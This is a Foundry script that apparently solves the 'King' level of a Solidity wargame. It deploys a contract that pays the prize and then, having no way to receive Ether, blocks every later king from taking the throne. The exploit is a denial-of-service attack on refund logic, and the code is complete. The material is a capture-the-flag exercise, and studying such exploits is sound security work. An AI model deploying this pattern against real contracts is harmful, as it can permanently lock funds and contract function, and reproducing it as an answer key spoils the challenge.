// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/09-King.sol";

contract TheLastKing {
    constructor(King _kingInstacne) payable {
        (bool result,) = address(_kingInstacne).call{value: _kingInstacne.prize()}("");
        require(result);
    }
}

contract KingSolution is Script {

    King public kingInstance = King(payable(0x941b83642d4D6F60264e4a846Fb05ab21932Cb10));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new TheLastKing{value: kingInstance.prize()}(kingInstance);
        vm.stopBroadcast();
    }
}